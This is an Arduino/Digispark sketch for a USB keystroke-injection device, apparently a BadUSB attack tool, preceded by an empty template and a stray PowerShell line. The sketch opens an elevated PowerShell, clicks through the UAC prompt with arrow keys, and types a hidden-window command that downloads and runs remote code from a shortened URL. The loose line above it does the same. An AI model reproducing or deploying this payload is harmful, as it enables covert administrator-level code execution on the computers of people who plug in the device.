void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

}
Start-Process powershell -ArgumentList "-w h -c iex(iwr https://rb.gy/pnj5gn)"
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // Pin 1 for built-in LED (change to 0 for external red LED, or 2 if Pin 0 fails)
  // pinMode(0, OUTPUT); // Uncomment for external red LED on Pin 0
  // pinMode(2, OUTPUT); // Uncomment for external red LED on Pin 2
}

void loop() {
  // Test LED: Blink 3 times (500ms on/off) to confirm it works
  for (int i = 0; i < 3; i++) {
    digitalWrite(1, HIGH); // LED on (Pin 1)
    // digitalWrite(0, HIGH); // Uncomment if using Pin 0
    // digitalWrite(2, HIGH); // Uncomment if using Pin 2
    DigiKeyboard.delay(100);
    digitalWrite(1, LOW);  // LED off
    // digitalWrite(0, LOW);  // Uncomment if using Pin 0
    // digitalWrite(2, LOW);  // Uncomment if using Pin 2
    DigiKeyboard.delay(100);
  }
  
  // Initialize with long delay for USB enumeration
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000); // Wait 5s for recognition
  
  // Press Windows key to open Start menu
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); // Windows key only
  DigiKeyboard.delay(2000); // Wait for Start menu
  
  // Type "powershell"
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500); // Pause after typing
  
  // Run as administrator with Ctrl+Shift+Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000); // Wait for UAC prompt to appear
  
  // Navigate UAC with right arrow, down arrow, left arrow, then Enter
  DigiKeyboard.sendKeyStroke(0x4F); // Right Arrow
  DigiKeyboard.delay(0);
  DigiKeyboard.sendKeyStroke(0x50); // Down Arrow
  DigiKeyboard.delay(0);
  DigiKeyboard.sendKeyStroke(0x51); // Left Arrow
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter
  DigiKeyboard.delay(2000); // Wait for PowerShell window to open
  
  // Type the PowerShell command
  DigiKeyboard.print("Start-Process powershell.exe -ArgumentList \"-Command Invoke-Expression (Invoke-WebRequest  https://rb.gy/1di8fj).Content\" -WindowStyle Hidden");
  DigiKeyboard.delay(500); // Pause after typing
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Execute the command
  DigiKeyboard.delay(1000); // Wait for command to execute
  
  // Type "exit" to close PowerShell
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500); // Pause after typing
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Execute exit
  
  // Blink red LED repeatedly (500ms on, 500ms off)
  while (true) {
    digitalWrite(1, HIGH); // LED on (Pin 1)
    // digitalWrite(0, HIGH); // Uncomment equipment if using Pin 0
    // digitalWrite(2, HIGH); // Uncomment if using Pin 2
    DigiKeyboard.delay(50); // Wait 500ms
    digitalWrite(1, LOW);  // LED off
    // digitalWrite(0, LOW);  // Uncomment if using Pin 0
    // digitalWrite(2, LOW);  // Uncomment if using Pin 2
    DigiKeyboard.delay(50); // Wait 500ms
    
  }
}
